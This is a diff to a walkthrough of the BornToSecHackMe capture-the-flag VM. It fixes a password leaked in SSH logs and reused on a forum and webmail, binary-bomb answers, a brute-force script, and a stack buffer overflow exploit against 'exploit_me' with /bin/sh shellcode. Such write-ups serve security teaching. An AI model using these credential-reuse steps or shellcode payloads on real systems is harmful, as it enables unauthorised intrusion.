@@ -133,14 +133,14 @@ We find a topic called "Probleme login ?" created by `lmezard`.
 It seems to contain SSH connection logs. While browsing them, we find this line:
 
 ```text
-Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\\]Ej?**5K5cy**AJ from 161.202.39.38 port 57764 ssh2
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
 ```
 
 We can guess that `lmezard` entered the password instead of the username. We try this password to log in to the forum:
 
 **Username:** lmezard
 
-**Password:** !q\\]Ej?**5K5cy**AJ
+**Password:** !q\]Ej?*5K5cy*AJ
 
 We are logged in to the forum.
 
@@ -150,7 +150,7 @@ We can try to log in to the webmail.
 
 **Name:** laurie@borntosec.net
 
-**Password:** !q\\]Ej?**5K5cy**AJ
+**Password:** !q\]Ej?*5K5cy*AJ
 
 We find an email with the subject "DB access".
 
@@ -485,13 +485,7 @@ For phase 2, I reproduce the logic in C and get:
 For phase 3, we only need to match one case:
 
 ```bash
-0 q 777
-```
-
-or
-
-```bash
-0 b 214
+1 b 214
 ```
 
 For phase 4, I wrote another script that reproduces the bomb's behavior and found:
@@ -539,62 +533,48 @@ For phase 6, we can see in Binary Ninja that the program expects six values and 
 order of these numbers. I brute-force the phase with this script:
 
 ```python
-cat > test.py <<'PY'
 
+cat > test.py <<'PY'
 # -*- coding: utf-8 -*-
 
 import itertools
-
 import subprocess
 
 phases = [
-
-"Public speaking is very easy.",
-
-"1 2 6 24 120 720",
-
-"0 q 777",
-
-"9",
-
-"opekmq"
-
+    "Public speaking is very easy.",
+    "1 2 6 24 120 720",
+    "0 q 777",
+    "9",
+    "opekmq"
 ]
 
 for perm in itertools.permutations(range(1, 7)):
+    phase6 = " ".join(map(str, perm))
+    stdin_data = "\n".join(phases + [phase6]) + "\n"
 
-phase6 = " ".join(map(str, perm))
+    print("Test : " + phase6)
 
-stdin_data = "\n".join(phases + [phase6]) + "\n"
+    process = subprocess.Popen(
+        ["/home/laurie/bomb"],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
 
-print("Test : " + phase6)
+    stdout, stderr = process.communicate(
+        stdin_data.encode("utf-8")
+    )
 
-process = subprocess.Popen(
+    output = stdout.decode("utf-8", errors="replace")
 
-["/home/laurie/bomb"],
-
-stdin=subprocess.PIPE,
-
-stdout=subprocess.PIPE,
-
-stderr=subprocess.PIPE
-
-)
-
-stdout, stderr = process.communicate(stdin_data)
-
-if "BOOM" not in stdout:
-
-print("====================")
-
-print("TROUVE : " + phase6)
-
-print("====================")
-
-print(stdout)
-
-break
-
+    if process.returncode == 0 and "BOOM" not in output:
+        print("====================")
+        print("TROUVE : " + phase6)
+        print("====================")
+        print(output)
+        break
+else:
+    print("Aucune permutation valide trouvée.")
 PY
 
 ```bash
@@ -696,11 +676,8 @@ We can use `0xbffffe63`.
 We now have everything we need for the exploit.
 
 ```bash
-$(python -c 'print "\x90" * 140 + "\x63\xfe\xff\xbf"') > /tmp/exploit
-```
-
-```bash
-env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')./exploit_me $(python -c 'print "\x90" * 140 + "\x63\xfe\xff\xbf"')
+env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+./exploit_me $(python -c 'print "\x90" * 140 + "\x63\xfe\xff\xbf"')
 ```
 
 ## Root Access
